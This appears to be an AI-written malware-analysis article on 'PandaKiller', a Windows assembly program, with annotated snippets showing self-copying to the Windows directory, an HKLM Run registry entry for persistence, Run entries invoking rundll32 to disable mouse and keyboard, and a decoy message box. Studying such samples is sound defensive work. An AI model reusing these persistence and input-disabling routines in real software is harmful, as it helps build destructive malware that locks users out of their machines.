
### **Analyzing the PandaKiller Malware: A Deep Dive into Assembly Code**

#### **Introduction**

Malware analysis is a crucial skill for cybersecurity professionals. In this article, we dissect the "PandaKiller" malware, a Windows-based threat written in assembly language. We will break down its functionalities, focusing on key snippets of code to understand its impact and behavior.

#### **Overview of PandaKiller**

PandaKiller is a malicious program designed to:

-   Self-replicate in the Windows directory.
-   Modify registry entries to persist on reboot.
-   Disable the keyboard and mouse.
-   Display a deceptive message to the user.

Let's analyze its core functionalities.

----------

### **1. Self-Replication in the Windows Directory**

The first step in PandaKiller's execution is copying itself to `%windir%\WinExec.exe`. The following code accomplishes this:

```assembly
push 00000000h
call GetModuleHandleA
push 260
push offset moi
push eax
call GetModuleFileNameA  ; Get the current executable path

push 260
push offset targ1
call GetWindowsDirectoryA  ; Get Windows directory path

push offset copie
push offset targ1
call lstrcat  ; Append "\WinExec.exe" to Windows directory path

push 00000000h
push offset targ1
push offset moi
call CopyFileA  ; Copy the malware to %windir%\WinExec.exe
```

#### **Analysis**

-   The malware retrieves its own file path using `GetModuleFileNameA`.
-   It appends the filename `WinExec.exe` to the Windows directory.
-   The `CopyFileA` API copies the executable to `%windir%\WinExec.exe`, ensuring persistence.

----------

### **2. Registry Modification for Persistence**

To ensure execution on startup, PandaKiller modifies the Windows registry. The malware creates a new registry entry under `HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run`:


```assembly
push offset l
push offset p
push 0
push 1F0000h + 1 + 2h
push 0
push 0
push 0
push offset CLE2
push 80000002h  ; HKEY_LOCAL_MACHINE
call RegCreateKeyExA

push 05h
push offset DONNEE2  ; "%windir%\WinExec.exe"
push 01h
push 0
push offset NOM2  ; "WinExec"
push p
call RegSetValueExA  ; Write the registry key
```

#### **Analysis**

-   `RegCreateKeyExA` opens the `Run` registry key.
-   `RegSetValueExA` creates a new entry named `WinExec`, pointing to the copied malware file.
-   This ensures that the malware executes at every system startup.

----------

### **3. Disabling the Mouse and Keyboard**

One of PandaKiller’s more destructive actions is disabling user input:


```assembly
push offset l
push offset p
push 0
push 1F0000h + 1 + 2h
push 0
push 0
push 0
push offset CLE2
push 80000002h  ; HKEY_LOCAL_MACHINE
call RegCreateKeyExA

push 05h
push offset DONNEE3  ; "rundll32 mouse,disable"
push 01h
push 0
push offset NOM3
push p
call RegSetValueExA  ; Disable mouse

push 05h
push offset DONNEE4  ; "rundll32 keyboard,disable"
push 01h
push 0
push offset NOM4
push p
call RegSetValueExA  ; Disable keyboard
```

#### **Analysis**

-   This code injects commands into the Windows registry to disable the mouse and keyboard using `rundll32`.
-   On next reboot, these settings will render the machine unusable.

----------

### **4. Displaying a Message to the User**

Finally, the malware presents a deceptive message:


```assembly
push 40h
push offset TITRE
push offset TEXTE
push 0
call MessageBoxA
```

#### **Analysis**

-   This triggers a Windows message box with the title `T.PK.3` and the text `"VOUS SOUHAITE UNE BONNE ANNEE !"`.
-   It serves as a distraction while the malware continues execution.

----------

### **Conclusion**

PandaKiller is a destructive malware with simple but effective techniques:

-   **Self-replication** for persistence.
-   **Registry modification** to ensure execution.
-   **User input lockdown** to make recovery difficult.
-   **Social engineering** through misleading messages.

Understanding its assembly code helps malware analysts recognize similar threats and develop mitigation strategies.

Would you like to see additional sections, such as **detection methods** or **countermeasures**? 🚀
